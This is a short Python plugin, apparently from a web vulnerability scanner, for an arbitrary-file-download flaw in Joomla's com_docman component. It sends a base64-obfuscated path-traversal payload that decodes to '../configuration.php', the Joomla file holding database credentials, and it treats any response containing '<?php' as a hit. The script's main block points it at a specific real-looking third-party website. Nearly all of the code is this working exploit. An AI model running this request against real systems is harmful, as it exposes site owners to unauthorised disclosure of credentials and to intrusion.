#coding:utf-8
from lib.curl import *
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Joomla com_docman 任意文件下载


def assign(service, arg):
    if service == 'joomla':
        return True, arg


def audit(arg):
    payload = 'components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA='
    target = arg + payload

    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "<?php" in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.elcalero.com/mb/')[1])